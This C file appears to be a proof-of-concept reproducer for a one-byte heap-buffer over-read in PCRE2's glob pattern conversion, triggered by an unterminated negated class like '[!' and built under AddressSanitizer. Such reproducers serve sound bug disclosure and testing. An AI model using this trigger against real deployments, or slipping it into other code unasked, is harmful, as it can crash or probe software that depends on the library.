/* PoC: pcre2_pattern_convert() glob conversion reads one code unit past the
end of the pattern when a negated character class is left unterminated right
after its negation character (e.g. "[!" or "[^").

The pattern is passed with an explicit length in an exact-sized heap buffer
(no terminating NUL), which the API documents and supports, so the read of
pattern[plength] is a genuine heap-buffer-overflow in the library.

Build (AddressSanitizer):
  clang -fsanitize=address -g -I<src> -o residual residual.c <libpcre2-8.a>
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define PCRE2_CODE_UNIT_WIDTH 8
#include "pcre2.h"

int main(void)
{
int rc;
PCRE2_SIZE length = 0;
PCRE2_UCHAR *converted = NULL;
PCRE2_SPTR pattern;
PCRE2_SIZE plength = 2;

pattern = (PCRE2_SPTR)malloc((size_t)plength);   /* exact size, no NUL */
if (pattern == NULL) return 1;

memcpy((void *)pattern, "[!", (size_t)plength);

rc = pcre2_pattern_convert(pattern, plength, PCRE2_CONVERT_GLOB,
  &converted, &length, NULL);

printf("pcre2_pattern_convert returned %d, offset %lu\n", rc,
  (unsigned long)length);

free((void *)pattern);
return 0;
}
